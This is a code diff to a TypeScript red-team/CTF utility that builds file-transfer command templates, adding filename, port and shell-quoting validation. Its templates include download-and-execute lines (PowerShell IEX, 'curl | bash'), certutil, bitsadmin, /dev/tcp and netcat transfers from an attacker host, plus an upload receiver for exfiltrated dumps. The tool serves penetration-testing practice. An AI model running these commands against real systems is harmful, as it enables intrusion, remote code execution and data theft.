@@ -2,6 +2,7 @@
  * ZeroBox Pure Offline Offensive File Transfer & TTY Utilities
  * Standardized staging listeners and target download commands for Red Team & CTF operations.
  */
+import { shellQuote } from './shellEncoders';
 
 export const COMMON_TRANSFER_TOOLS = [
   'linpeas.sh',
@@ -32,9 +33,28 @@ export interface FileTransferOptions {
   cred?: string;
 }
 
+/** Double-quote a value for Windows cmd.exe copy-paste (strips CR/LF, doubles embedded "). */
+function winDoubleQuote(s: string): string {
+  const clean = (s ?? '').replace(/[\r\n]/g, '');
+  return `"${clean.replace(/"/g, '""')}"`;
+}
+
 export function generateFileTransferMethods(opts: FileTransferOptions): FileTransferMethod[] {
   const { lhost, lport, filename, targetIp = '10.10.10.X', user = 'kali', cred = 'kali' } = opts;
-  const safeFile = filename.trim() || 'tools.exe';
+  const safeFile = (filename.trim() || 'tools.exe');
+  if (!/^[A-Za-z0-9._-]+$/.test(safeFile)) throw new Error('Invalid filename');
+  const portNum = Number(String(lport).trim());
+  if (!Number.isInteger(portNum) || portNum < 1 || portNum > 65535) throw new Error('Invalid lport');
+  const encodedFile = encodeURIComponent(safeFile);
+  const qFile = shellQuote(safeFile);
+  const qTmpFile = shellQuote(`/tmp/${safeFile}`);
+  const qUser = shellQuote((user ?? '').trim() || 'kali');
+  const qCred = shellQuote((cred ?? '').trim() || 'kali');
+  const wCred = winDoubleQuote((cred ?? '').trim() || 'kali');
+  const wUser = winDoubleQuote((user ?? '').trim() || 'kali');
+  const wSafeFile = `"${safeFile}"`;
+  const wUncFile = `"\\\\${lhost}\\tools\\${safeFile}"`;
+  const wUncDest = `"C:\\temp\\${safeFile}"`;
 
   return [
     // --- Attacker Staging Servers ---
@@ -43,8 +63,8 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       os: 'server',
       category: 'server',
       title: 'Python 3 HTTP Staging Server',
-      description: `Host current directory over HTTP port ${lport} serving ${safeFile}.`,
-      commandTemplate: `python3 -m http.server ${lport}`,
+      description: `Host current directory over HTTP port ${portNum} serving ${safeFile}.`,
+      commandTemplate: `python3 -m http.server ${portNum}`,
     },
     {
       id: 'srv-smb-impacket',
@@ -52,7 +72,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'server',
       title: 'Impacket SMB Server (SMB2)',
       description: `Host local directory as SMB share "tools" with SMB2 enabled.`,
-      commandTemplate: `impacket-smbserver tools $(pwd) -smb2support -user ${user} -password ${cred}`,
+      commandTemplate: `impacket-smbserver tools "$(pwd)" -smb2support -username ${qUser} -password ${qCred}`,
     },
     {
       id: 'srv-upload-py',
@@ -60,7 +80,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'server',
       title: 'Python Upload Receiver (uploadserver)',
       description: `Accept HTTP POST uploads from targets (e.g. exfiltrating dumps/hashes).`,
-      commandTemplate: `python3 -m uploadserver ${lport}`,
+      commandTemplate: `python3 -m uploadserver ${portNum}`,
     },
     {
       id: 'srv-ftp-py',
@@ -68,7 +88,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'server',
       title: 'Python Writable FTP Server (pyftpdlib)',
       description: `Standalone writeable FTP listener for non-interactive downloads.`,
-      commandTemplate: `python3 -m pyftpdlib -p 21 -w -u ${user} -P ${cred}`,
+      commandTemplate: `python3 -m pyftpdlib -p 21 -w -u ${qUser} -P ${qCred}`,
     },
 
     // --- Windows Targets ---
@@ -78,7 +98,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'CertUtil Cache Split (Windows)',
       description: `Native binary download using certutil.exe; leaves cache artifacts.`,
-      commandTemplate: `certutil -urlcache -split -f "http://${lhost}:${lport}/${safeFile}" ${safeFile}`,
+      commandTemplate: `certutil -urlcache -split -f "http://${lhost}:${portNum}/${encodedFile}" ${wSafeFile}`,
     },
     {
       id: 'win-ps-iwr',
@@ -86,7 +106,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'PowerShell Invoke-WebRequest (iwr)',
       description: `Standard PowerShell 3+ file download directly saving to disk.`,
-      commandTemplate: `powershell -c "Invoke-WebRequest -Uri 'http://${lhost}:${lport}/${safeFile}' -OutFile '${safeFile}'"`,
+      commandTemplate: `powershell -c "Invoke-WebRequest -Uri 'http://${lhost}:${portNum}/${encodedFile}' -OutFile '${safeFile}'"`,
     },
     {
       id: 'win-ps-webclient',
@@ -94,7 +114,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'PowerShell WebClient DownloadFile',
       description: `Low-profile legacy .NET WebClient download (PowerShell 2.0 compatible).`,
-      commandTemplate: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${lhost}:${lport}/${safeFile}', '${safeFile}')"`,
+      commandTemplate: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${lhost}:${portNum}/${encodedFile}', '${safeFile}')"`,
     },
     {
       id: 'win-ps-iex',
@@ -102,7 +122,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'in-memory',
       title: 'PowerShell In-Memory Download & Execute (IEX)',
       description: `Fetch and execute remote script in memory without touching target disk.`,
-      commandTemplate: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/${safeFile}')"`,
+      commandTemplate: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${portNum}/${encodedFile}')"`,
     },
     {
       id: 'win-smb-copy',
@@ -110,7 +130,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'Windows SMB UNC Direct Copy',
       description: `Mount and copy file directly from attacker SMB share over port 445.`,
-      commandTemplate: `net use \\\\${lhost}\\tools /u:${user} ${cred} && copy \\\\${lhost}\\tools\\${safeFile} C:\\temp\\${safeFile}`,
+      commandTemplate: `net use \\\\${lhost}\\tools ${wCred} /user:${wUser} && copy ${wUncFile} ${wUncDest}`,
     },
     {
       id: 'win-bitsadmin',
@@ -118,7 +138,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'Bitsadmin Background Transfer',
       description: `Native Windows background intelligent transfer service (BITS).`,
-      commandTemplate: `bitsadmin /transfer job /download /priority normal http://${lhost}:${lport}/${safeFile} C:\\temp\\${safeFile}`,
+      commandTemplate: `bitsadmin /transfer job /download /priority normal http://${lhost}:${portNum}/${encodedFile} ${wUncDest}`,
     },
 
     // --- Linux Targets ---
@@ -128,7 +148,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'Linux cURL File Download',
       description: `Fetch binary and mark as executable in one command.`,
-      commandTemplate: `curl -s -L "http://${lhost}:${lport}/${safeFile}" -o ${safeFile} && chmod +x ${safeFile}`,
+      commandTemplate: `curl -s -L "http://${lhost}:${portNum}/${encodedFile}" -o ${qFile} && chmod +x ${qFile}`,
     },
     {
       id: 'lin-curl-pipe',
@@ -136,7 +156,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'in-memory',
       title: 'Linux cURL Pipe to Shell (In-Memory)',
       description: `Stream script from staging server directly into bash process.`,
-      commandTemplate: `curl -s "http://${lhost}:${lport}/${safeFile}" | bash`,
+      commandTemplate: `curl -s "http://${lhost}:${portNum}/${encodedFile}" | bash`,
     },
     {
       id: 'lin-wget',
@@ -144,7 +164,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'Linux Wget Download',
       description: `Download payload to /tmp directory and make executable.`,
-      commandTemplate: `wget "http://${lhost}:${lport}/${safeFile}" -O /tmp/${safeFile} && chmod +x /tmp/${safeFile}`,
+      commandTemplate: `wget "http://${lhost}:${portNum}/${encodedFile}" -O ${qTmpFile} && chmod +x ${qTmpFile}`,
     },
     {
       id: 'lin-dev-tcp',
@@ -152,7 +172,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'Bash /dev/tcp Raw Socket Transfer',
       description: `Living-off-the-land HTTP download using pure bash sockets without curl/wget.`,
-      commandTemplate: `exec 3<>/dev/tcp/${lhost}/${lport}; echo -e "GET /${safeFile} HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3 > /tmp/${safeFile}`,
+      commandTemplate: `exec 3<>/dev/tcp/${lhost}/${portNum}; echo -e "GET /${encodedFile} HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3 > ${qTmpFile}`,
     },
     {
       id: 'lin-nc-rx',
@@ -160,7 +180,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'Netcat TCP Pipe Transfer',
       description: `Listen on target port 9001 and receive direct raw stream from attacker.`,
-      commandTemplate: `nc -lvnp 9001 > /tmp/${safeFile}  # Attacker sends: nc -vn ${targetIp} 9001 < ${safeFile}`,
+      commandTemplate: `nc -lvnp 9001 > ${qTmpFile}  # Attacker sends: nc -vn ${targetIp} 9001 < ${qFile}`,
     },
     {
       id: 'lin-base64',
@@ -168,7 +188,7 @@ export function generateFileTransferMethods(opts: FileTransferOptions): FileTran
       category: 'download',
       title: 'Base64 Clipboard Echo Transfer',
       description: `Transfer small script/binary across terminal copy-paste without outbound network.`,
-      commandTemplate: `cat ${safeFile} | base64 -w 0  # Paste on target: echo "<BASE64>" | base64 -d > ${safeFile}`,
+      commandTemplate: `cat ${qFile} | base64 -w 0  # Paste on target: echo "<BASE64>" | base64 -d > ${qFile}`,
     },
   ];
 }
